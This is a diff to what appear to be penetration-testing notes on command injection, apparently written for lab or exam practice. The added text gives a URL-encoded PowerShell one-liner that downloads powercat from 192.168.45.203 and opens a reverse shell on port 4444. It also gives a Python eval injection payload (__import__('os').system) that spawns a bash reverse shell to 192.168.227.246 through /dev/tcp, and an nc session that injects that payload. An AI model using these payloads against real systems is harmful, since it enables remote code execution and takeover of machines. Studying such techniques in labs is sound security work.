@@ -1,6 +1,5 @@
 
 ---
-
 ## PoC
 
 Assuming there is an vulnerable Archive parameter on an utility which allows us to git clone repositorys.
@@ -58,4 +57,30 @@ Prompt the following after the git command + after semicolon, this script downlo
 
 ```
 IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.203%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.203%20-p%204444%20-e%20powershell
+```
+
+## Python Command Injection
+
+If we have an python application, we should catch the package with nc and test command injection like this, in most cases it gets distributed through eval(). In which normal python syntax isn't working. 
+
+Try this:
+
+```
+__import__('os').system('id')
+```
+
+RCE Command Injection (Linux)
+
+```
+__import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.227.246/80 0>&1"')
+```
+
+
+
+```
+nc 10.113.152.8 10000
+
+        Private 0days
+
+ Please enther number of exploits to send??: __import__('os').system('/bin/bash -c "bash -i >& /dev/tcp/192.168.227.246/80 0>&1"')
 ```
